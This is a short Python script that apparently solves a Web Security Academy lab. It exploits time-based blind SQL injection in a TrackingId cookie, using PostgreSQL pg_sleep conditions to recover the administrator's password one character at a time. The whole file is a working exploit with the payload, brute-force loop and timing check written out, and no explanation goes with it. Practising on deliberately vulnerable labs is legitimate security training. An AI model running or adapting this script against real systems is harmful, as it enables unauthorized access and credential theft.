import requests

import string

  

url = "https://0ae3007f038319c580d7eeaf0079000f.web-security-academy.net/"

  

session = requests.Session()

  

cookies = {

    "TrackingId": "",

    "session": "jBeN08HCxv9RCDws14rWTk91nW266lUl"

}

  

charset = string.ascii_letters + string.digits

password = ""

  

for position in range(1, 50):

    found = False

    for char in charset:

        payload = (

            "isPtYeczDWbhaP2i' || " f"(SELECT CASE WHEN SUBSTR(password, {position}, 1) = '{char}' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator')-- -"

        )

        cookies["TrackingId"] = payload

        try:

            response = session.get(url, cookies=cookies, timeout=20)

  

            if response.elapsed.total_seconds() > 10:

                password += char

  

                print(f"[+] Position {position}: {char}")

                print(f"[+] Password: {password}")

  

                found = True

                break

  

        except requests.exceptions.RequestException as e:

            print(f"[!] Request error: {e}")

            break

    if not found:

        break

  

print("\nFinal password:", password)
